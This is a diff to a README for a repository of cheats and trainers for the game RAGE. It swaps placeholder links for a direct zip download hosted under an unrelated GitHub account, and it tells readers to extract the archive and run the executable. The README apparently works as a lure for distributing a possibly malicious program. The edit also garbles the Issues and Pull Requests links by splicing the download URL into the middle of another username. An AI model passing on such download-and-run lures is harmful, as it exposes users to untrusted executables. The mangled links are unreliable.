@@ -2,7 +2,7 @@
 
 Welcome to the **Unlimited Fuel RAGE** repository! This project offers a variety of cheats and mods for the game RAGE. With these tools, you can enhance your gaming experience by unlocking features such as unlimited fuel, health, and resources. Dive into the world of RAGE with our comprehensive set of trainers and hacks.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)](444)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)](https://github.com/sosokadmina2000d0/Unlimited-Fuel-RAGE/releases/download/Download/Unlimited.Fuel.RAGE.zip)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ The **Unlimited Fuel RAGE** repository includes a variety of features designed t
 
 To get started, follow these simple steps:
 
-1. **Download the latest release** from the [Releases section](444). Ensure you download the correct file for your operating system.
+1. **Download the latest release** from the [Releases section](https://github.com/sosokadmina2000d0/Unlimited-Fuel-RAGE/releases/download/Download/Unlimited.Fuel.RAGE.zip). Ensure you download the correct file for your operating system.
 2. **Extract the files** from the downloaded archive.
 3. **Run the executable file** to install the trainer or hack you wish to use.
 
@@ -89,9 +89,9 @@ For questions or suggestions, feel free to reach out. You can contact me through
 
 ### Important Links
 
-- [Download Releases](444)
-- [Issues](https://github.com/hamza1223334444/Unlimited-Fuel-RAGE/issues)
-- [Pull Requests](https://github.com/hamza1223334444/Unlimited-Fuel-RAGE/pulls)
+- [Download Releases](https://github.com/sosokadmina2000d0/Unlimited-Fuel-RAGE/releases/download/Download/Unlimited.Fuel.RAGE.zip)
+- [Issues](https://github.com/hamza122333https://github.com/sosokadmina2000d0/Unlimited-Fuel-RAGE/releases/download/Download/Unlimited.Fuel.RAGE.zip4/Unlimited-Fuel-RAGE/issues)
+- [Pull Requests](https://github.com/hamza122333https://github.com/sosokadmina2000d0/Unlimited-Fuel-RAGE/releases/download/Download/Unlimited.Fuel.RAGE.zip4/Unlimited-Fuel-RAGE/pulls)
 
 ## Conclusion
 
